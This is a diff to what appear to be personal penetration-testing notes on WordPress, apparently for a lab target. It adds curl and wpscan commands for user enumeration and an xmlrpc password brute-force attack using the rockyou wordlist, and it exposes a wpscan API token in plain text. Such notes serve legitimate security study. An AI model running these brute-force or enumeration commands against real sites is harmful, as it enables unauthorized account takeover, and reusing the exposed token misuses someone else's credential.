@@ -62,7 +62,11 @@ curl -s -I http://TARGET-IP/?author=1
 curl http://TARGET-IP/wp-json/wp/v2/users | jq
 ```
 ## WPSCAM
+### Enumerate
 ```bash
 wpscan --url http://94.237.48.51:32588 --enumerate --api-token Zgus5KAsiK755cpYUNX2ba1KcsdIrIDEjnR5mkPGjzU
 ```
-
+### Brute Force
+```bash
+wpscan --url http://94.237.48.51:32588 --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt 
+```
